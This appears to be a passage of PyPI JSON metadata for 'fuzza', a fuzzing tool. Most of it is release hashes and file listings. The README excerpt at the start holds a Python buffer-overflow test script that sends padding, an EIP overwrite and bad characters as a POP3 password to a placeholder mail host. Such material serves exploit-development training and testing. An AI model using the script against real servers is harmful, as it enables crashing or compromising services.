class=\"s2\">\"</span><span class=\"se\">\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff</span><span class=\"s2\">\"</span>\n<span class=\"p\">)</span>\n\n<span class=\"n\">buffer</span> <span class=\"o\">=</span> <span class=\"s2\">\"A\"</span><span class=\"o\">*</span><span class=\"n\">len_overflow</span> <span class=\"o\">+</span> <span class=\"n\">eip</span> <span class=\"o\">+</span> <span class=\"n\">badchars</span>\n\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s1\">'Trying to send </span><span class=\"si\">%s</span><span class=\"s1\"> bytes buffer...'</span> <span class=\"o\">%</span> <span class=\"p\">(</span><span class=\"nb\">str</span><span class=\"p\">(</span><span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">buffer</span><span class=\"p\">))))</span>\n<span class=\"k\">try</span><span class=\"p\">:</span>\n    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">connect</span><span class=\"p\">((</span><span class=\"s1\">'mail.example.tld'</span><span class=\"p\">,</span> <span class=\"mi\">110</span><span class=\"p\">))</span>\n    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">recv</span><span class=\"p\">(</span><span class=\"mi\">1024</span><span class=\"p\">)</span>\n    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">send</span><span class=\"p\">(</span><span class=\"n\">str2b</span><span class=\"p\">(</span><span class=\"s1\">'USER test</span><span class=\"se\">\\r\\n</span><span class=\"s1\">'</span><span class=\"p\">))</span>\n    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">recv</span><span class=\"p\">(</span><span class=\"mi\">1024</span><span class=\"p\">)</span>\n    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">send</span><span class=\"p\">(</span><span class=\"n\">str2b</span><span class=\"p\">(</span><span class=\"s1\">'PASS '</span> <span class=\"o\">+</span> <span class=\"n\">buffer</span> <span class=\"o\">+</span> <span class=\"s1\">'</span><span class=\"se\">\\r\\n</span><span class=\"s1\">'</span><span class=\"p\">))</span>\n    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">recv</span><span class=\"p\">(</span><span class=\"mi\">1024</span><span class=\"p\">)</span>\n    <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">send</span><span class=\"p\">(</span><span class=\"n\">str2b</span><span class=\"p\">(</span><span class=\"s1\">'QUIT</span><span class=\"se\">\\r\\n</span><span class=\"s1\">'</span><span class=\"p\">))</span>\n    <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s1\">'done'</span><span class=\"p\">)</span>\n<span class=\"k\">except</span><span class=\"p\">:</span>\n    <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s1\">'Could not connect'</span><span class=\"p\">)</span>\n<span class=\"n\">s</span><span class=\"o\">.</span><span class=\"n\">close</span><span class=\"p\">()</span>\n</pre>\n<h2>Disclaimer</h2>\n<p>This tool may be used for legal purposes only. Users take full responsibility for any actions performed using this tool. The author accepts no liability for damage caused by this tool. If these terms are not acceptable to you, then do not use this tool.</p>\n<h2>License</h2>\n<p><strong><a href=\"LICENSE.txt\" rel=\"nofollow\">MIT License</a></strong></p>\n<p>Copyright (c) 2020 <strong><a href=\"https://github.com/cytopia\" rel=\"nofollow\">cytopia</a></strong></p>\n\n          </div>"}, "last_serial": 6514327, "releases": {"0.1.0": [{"comment_text": "", "digests": {"md5": "9b9e0f2660f7f884fef5f82ddfc0b2d9", "sha256": "0311ef7b72bb05841cbc4435e7ad3bb59c889d4580d8ea15acec9ca689078a5f"}, "downloads": -1, "filename": "fuzza-0.1.0-py2.py3-none-any.whl", "has_sig": false, "md5_digest": "9b9e0f2660f7f884fef5f82ddfc0b2d9", "packagetype": "bdist_wheel", "python_version": "py2.py3", "requires_python": null, "size": 4302, "upload_time": "2020-01-18T19:56:39", "upload_time_iso_8601": "2020-01-18T19:56:39.414166Z", "url": "https://files.pythonhosted.org/packages/41/78/194e77ab75c98b2067036b1b51cf088214024be98cb369ecd1ba473560b6/fuzza-0.1.0-py2.py3-none-any.whl", "yanked": false}, {"comment_text": "", "digests": {"md5": "622e348af61acaf113011f94178e1b98", "sha256": "e0991d4fcac70c53a8b5a60a82657a8c486fba78b782149c963c8cb061a93bb4"}, "downloads": -1, "filename": "fuzza-0.1.0.tar.gz", "has_sig": false, "md5_digest": "622e348af61acaf113011f94178e1b98", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 3335, "upload_time": "2020-01-18T19:56:41", "upload_time_iso_8601": "2020-01-18T19:56:41.536911Z", "url": "https://files.pythonhosted.org/packages/e6/13/263ae57c82203ae57bc03e249ed1ab53e11d65827effbadcd7ebfea12f11/fuzza-0.1.0.tar.gz", "yanked": false}], "0.2.0": [{"comment_text": "", "digests": {"md5": "1478c22408e8873f5cd051519520d62d", "sha256": "65b3234ac2d28b99f7439b34f5b129f42faa065122264375fb523675c0559cb0"}, "downloads": -1, "filename": "fuzza-0.2.0-py2.py3-none-any.whl", "has_sig": false, "md5_digest": "1478c22408e8873f5cd051519520d62d", "packagetype": "bdist_wheel", "python_version": "py2.py3", "requires_python": null, "size": 6409, "upload_time": "2020-01-18T23:01:45", "upload_time_iso_8601": "2020-01-18T23:01:45.338921Z", "url": "https://files.pythonhosted.org/packages/6d/f9/e406e8ea1b0a1581897eb3073e63f464a787ed69ac5d402a3164dedfb070/fuzza-0.2.0-py2.py3-none-any.whl", "yanked": false}, {"comment_text": "", "digests": {"md5": "e47bffe58334044b55a3387ffe34ce82", "sha256": "540ed670a958d830cd2ab5be79b504b18a2993be212f8343b7b6a1dd3e1191bd"}, "downloads": -1, "filename": "fuzza-0.2.0.tar.gz", "has_sig": false, "md5_digest": "e47bffe58334044b55a3387ffe34ce82", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 5253, "upload_time": "2020-01-18T23:01:47", "upload_time_iso_8601": "2020-01-18T23:01:47.211645Z", "url": "https://files.pythonhosted.org/packages/1c/4d/a85620cb5ba1facffaaf98bd89b96176b730f7d9c58825a7769c093ddc95/fuzza-0.2.0.tar.gz", "yanked": false}], "0.3.0": [{"comment_text": "", "digests": {"md5": "36272bc4f798e146b6703c3210f98e7b", "sha256": "a95bbfffa6344eccd55984311df0cae99bfbddfa71c176e2f4248e6cab77f6c7"}, "downloads": -1, "filename": "fuzza-0.3.0-py2.py3-none-any.whl", "has_sig": false, "md5_digest": "36272bc4f798e146b6703c3210f98e7b", "packagetype": "bdist_wheel", "python_version": "py2.py3", "requires_python": null, "size": 7121, "upload_time": "2020-01-19T12:26:12", "upload_time_iso_8601": "2020-01-19T12:26:12.853053Z", "url": "https://files.pythonhosted.org/packages/a5/96/4a7921e3fdc97ee3d3a329a03ad84a6c0ac03df274c6f4c9dfb131e09daa/fuzza-0.3.0-py2.py3-none-any.whl", "yanked": false}, {"comment_text": "", "digests": {"md5": "5b3c34ff9612ea57003ae8f89ced36b4", "sha256": "577e63dce1be8ea3f6a21300942e2d8372d5d88c1959a720882bfd7bad005c66"}, "downloads": -1, "filename": "fuzza-0.3.0.tar.gz", "has_sig": false, "md5_digest": "5b3c34ff9612ea57003ae8f89ced36b4", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 5880, "upload_time": "2020-01-19T12:26:14", "upload_time_iso_8601": "2020-01-19T12:26:14.911241Z", "url": "https://files.pythonhosted.org/packages/b8/9b/7b5e26874093d1a9e03f7414b29963e2ea3b64d51260d61b29e94f825543/fuzza-0.3.0.tar.gz", "yanked": false}], "0.4.0": [{"comment_text": "", "digests": {"md5": "d49ed25ace2ba181eb4101a011064891", "sha256": "de0fa7ce18a9ff7cf211fd1caf9ca6b3f64ee5136737231ecbd32c092c946322"}, "downloads": -1, "filename": "fuzza-0.4.0-py2.py3-none-any.whl", "has_sig": false, "md5_digest": "d49ed25ace2ba181eb4101a011064891", "packagetype": "bdist_wheel", "python_version": "py2.py3", "requires_python": null, "size": 10627, "upload_time": "2020-01-19T15:19:36", "upload_time_iso_8601": "2020-01-19T15:19:36.583387Z", "url": "https://files.pythonhosted.org/packages/67/9c/2ecff85bc745bf500c118b23a7be5e3aa7e18da169f8ef14a956c29879a3/fuzza-0.4.0-py2.py3-none-any.whl", "yanked": false}, {"comment_text": "", "digests": {"md5": "5ba741c7d4d4087e723a53f2a7b8ae2d", "sha256": "c13a222375065140f9b019b228b0bb30c8c1c7c329e804e90e6edba5d0ec945f"}, "downloads": -1, "filename": "fuzza-0.4.0.tar.gz", "has_sig": false, "md5_digest": "5ba741c7d4d4087e723a53f2a7b8ae2d", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 9351, "upload_time": "2020-01-19T15:19:38", "upload_time_iso_8601": "2020-01-19T15:19:38.366784Z", "url": "https://files.pythonhosted.org/packages/f8/77/1418bcf7a29934ea320a634bc55c84baeced2a700dd616ce1b5a0e218bf6/fuzza-0.4.0.tar.gz", "yanked": false}], "0.4.1": [{"comment_text": "", "digests": {"md5": "aab91e7669fc9de3d9a78f523c32fd9f", "sha256": "39071d835424b4c36054881da434d7e9377acc659cc212a20fc6ef37a815cb96"}, "downloads": -1, "filename": "fuzza-0.4.1-py2.py3-none-any.whl", "has_sig": false, "md5_digest": "aab91e7669fc9de3d9a78f523c32fd9f", "packagetype": "bdist_wheel", "python_version": "py2.py3", "requires_python": null, "size": 26410, "upload_time": "2020-01-19T16:07:22", "upload_time_iso_8601": "2020-01-19T16:07:22.854916Z", "url": "https://files.pythonhosted.org/packages/71/6a/c540b686207cffeae8ea1514ce50df75874d9cb6821776cddf4edec5d179/fuzza-0.4.1-py2.py3-none-any.whl", "yanked": false}, {"comment_text": "", "digests": {"md5": "1a94a0f6e92f67046f33d3eec7054a2b", "sha256": "c0a80beda9fa2d1aaf4317060cf3f25822dd383f3bc6876fb2406cf4b2b71e7a"}, "downloads": -1, "filename": "fuzza-0.4.1.tar.gz", "has_sig": false, "md5_digest": "1a94a0f6e92f67046f33d3eec7054a2b", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 21075, "upload_time": "2020-01-19T16:07:24", "upload_time_iso_8601": "2020-01-19T16:07:24.852658Z", "url": "https://files.pythonhosted.org/packages/87/26/3f2e677d12c2b64a4778b24f43844a1d419ee2d604802955d022f4a91d17/fuzza-0.4.1.tar.gz", "yanked": false}], "0.4.2": [{"comment_text": "", "digests": {"md5": "debed97e96fcddc1f7f974de5494caab", "sha256": "8f11149c8b79c2d0b1fd69bda8cd64a129e1c21088bdae2085a2b1859665668f"}, "downloads": -1, "filename": "fuzza-0.4.2-py2.py3-none-any.whl", "has_sig": false, "md5_digest": "debed97e96fcddc1f7f974de5494caab", "packagetype": "bdist_wheel", "python_version": "py2.py3", "requires_python": null, "size": 20875, "upload_time": "2020-01-19T17:16:31", "upload_time_iso_8601": "2020-01-19T17:16:31.065961Z", "url": "https://files.pythonhosted.org/packages/74/f5/f928eb1bf07f5a5295847a80f1be517b35e1dd4bf61eb341720864586d51/fuzza-0.4.2-py2.py3-none-any.whl", "yanked": false}, {"comment_text": "", "digests": {"md5": "85003fdb77347676d0bb489713ee0d7d", "sha256": "50a4d4a57952f2ffdd822c8fbce0fc69abb78fbd275163c430804bf501d350a5"}, "downloads": -1, "filename": "fuzza-0.4.2.tar.gz", "has_sig": false, "md5_digest": "85003fdb77347676d0bb489713ee0d7d", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 19904, "upload_time": "2020-01-19T17:16:32", "upload_time_iso_8601": "2020-01-19T17:16:32.950643Z", "url": "https://files.pythonhosted.org/packages/b6/14/ff263a024403d2af2031920533f9c1ec7d0c650a074a3ef869037f4c7131/fuzza-0.4.2.tar.gz", "yanked": false}], "0.4.3": [{"comment_text": "", "digests": {"md5": "0cb0a0764450394bac7a086bec650060", "sha256": "5ef790bb537f2386a6d0d4523742f92cb90a6fbdbfc26c5af7664f9ff79e3667"}, "downloads": -1, "filename": "fuzza-0.4.3-py2.py3-none-any.whl", "has_sig": false, "md5_digest": "0cb0a0764450394bac7a086bec650060", "packagetype": "bdist_wheel", "python_version": "py2.py3", "requires_python": null, "size": 21003, "upload_time": "2020-01-20T08:31:17", "upload_time_iso_8601": "2020-01-20T08:31:17.373992Z", "url": "https://files.pythonhosted.org/packages/57/70/fd792adc70a94aeb4110cdfafdbb7920d3a177d02309f316305096d2d956/fuzza-0.4.3-py2.py3-none-any.whl", "yanked": false}, {"comment_text": "", "digests": {"md5": "d1e21da81a132f8c93cfc0d1dd8261c3", "sha256": "ddc763e380b5083f33d66bf16a495cce852484257feab7be9892be38fad0efe0"}, "downloads": -1, "filename": "fuzza-0.4.3.tar.gz", "has_sig": false, "md5_digest": "d1e21da81a132f8c93cfc0d1dd8261c3", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 20007, "upload_time": "2020-01-20T08:31:18", "upload_time_iso_8601": "2020-01-20T08:31:18.927474Z", "url": "https://files.pythonhosted.org/packages/70/99/774ea78f9317261eb06cea9f42b67693c7a3fc60643511fd46f23f7b04de/fuzza-0.4.3.tar.gz", "yanked": false}], "0.5.0": [{"comment_text": "", "digests": {"md5": "947e7006ab902fc750bdfe7217743c35", "sha256": "d61a154f9eee3aee806f39c5f7fea69dafa5c1dbbeee37b7a319c28f7a0d7970"}, "downloads": -1, "filename": "fuzza-0.5.0-py2.py3-none-any.whl", "has_sig": false, "md5_digest": "947e7006ab902fc750bdfe7217743c35", "packagetype": "bdist_wheel", "python_version": "py2.py3", "requires_python": null, "size": 22468, "upload_time": "2020-01-20T14:47:11", "upload_time_iso_8601": "2020-01-20T14:47:11.654928Z", "url": "https://files.pythonhosted.org/packages/98/a5/fb4f808a3c55ed22eb0dd5dbc6cdeb06d96e7244dff5770abcad1671eb5a/fuzza-0.5.0-py2.py3-none-any.whl", "yanked": false}, {"comment_text": "", "digests": {"md5": "ff7cbfde0442a36305933060124f6d8f", "sha256": "ad3a7705f5a328bb7a6a512f2f645e642cc5b845a5e5201c4832760b7a01e52d"}, "downloads": -1, "filename": "fuzza-0.5.0.tar.gz", "has_sig": false, "md5_digest": "ff7cbfde0442a36305933060124f6d8f", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 22295, "upload_time": "2020-01-20T14:47:13", "upload_time_iso_8601": "2020-01-20T14:47:13.525436Z", "url": "https://files.pythonhosted.org/packages/e3/a1/c105fdb1ee1359d6c6686e67737770955bc9e8a26994bc7831c078b761f5/fuzza-0.5.0.tar.gz", "yanked": false}], "0.6.0": [{"comment_text": "", "digests": {"md5": "6bb955c6c2de487f0ff2f2453d7fe3ed", "sha256": "b2e89ee9ba6f60fee700ec0711c2e13b83e6ac08220e504613da6f2689fbbe85"}, "downloads": -1, "filename": "fuzza-0.6.0-py2.py3-none-any.whl", "has_sig": false, "md5_digest": "6bb955c6c2de487f0ff2f2453d7fe3ed", "packagetype": "bdist_wheel", "python_version": "py2.py3", "requires_python": null, "size": 22938, "upload_time": "2020-01-24T15:38:18", "upload_time_iso_8601": "2020-01-24T15:38:18.644674Z", "url": "https://files.pythonhosted.org/packages/d0/a2/88aa5c3a24fc84d12930e1d9699353106e556fc76378d1e116806ee51064/fuzza-0.6.0-py2.py3-none-any.whl", "yanked": false}, {"comment_text": "", "digests": {"md5": "e219fd45139bfaad5aaca79e930ce857", "sha256": "c562d7a06a3807fb6c7a4c28e2f1236c14e4ac51917724c0f850548d6e7e6616"}, "downloads": -1, "filename": "fuzza-0.6.0.tar.gz", "has_sig": false, "md5_digest": "e219fd45139bfaad5aaca79e930ce857", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 22980, "upload_time": "2020-01-24T15:38:21", "upload_time_iso_8601": "2020-01-24T15:38:21.927860Z", "url": "https://files.pythonhosted.org/packages/cb/e8/55e279932db0f1ead9ddeebe9a54aaed6cee4656856139c1a21435d59643/fuzza-0.6.0.tar.gz", "yanked": false}]}, "urls": [{"comment_text": "", "digests": {"md5": "6bb955c6c2de487f0ff2f2453d7fe3ed", "sha256": "b2e89ee9ba6f60fee700ec0711c2e13b83e6ac08220e504613da6f2689fbbe85"}, "downloads": -1, "filename": "fuzza-0.6.0-py2.py3-none-any.whl", "has_sig": false, "md5_digest": "6bb955c6c2de487f0ff2f2453d7fe3ed", "packagetype": "bdist_wheel", "python_version": "py2.py3", "requires_python": null, "size": 22938, "upload_time": "2020-01-24T15:38:18", "upload_time_iso_8601": "2020-01-24T15:38:18.644674Z", "url": "https://files.pythonhosted.org/packages/d0/a2/88aa5c3a24fc84d12930e1d9699353106e556fc76378d1e116806ee51064/fuzza-0.6.0-py2.py3-none-any.whl", "yanked": false}, {"comment_text": "", "digests": {"md5": "e219fd45139bfaad5aaca79e930ce857", "sha256": "c562d7a06a3807fb6c7a4c28e2f1236c14e4ac51917724c0f850548d6e7e6616"}, "downloads": -1, "filename": "fuzza-0.6.0.tar.gz", "has_sig": false, "md5_digest": "e219fd45139bfaad5aaca79e930ce857", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 22980, "upload_time": "2020-01-24T15:38:21", "upload_time_iso_8601": "2020-01-24T15:38:21.927860Z", "url": "https://files.pythonhosted.org/packages/cb/e8/55e279932db0f1ead9ddeebe9a54aaed6cee4656856139c1a21435d59643/fuzza-0.6.0.tar.gz", "yanked": false}], "timestamp": "Fri May  8 00:59:33 2020"}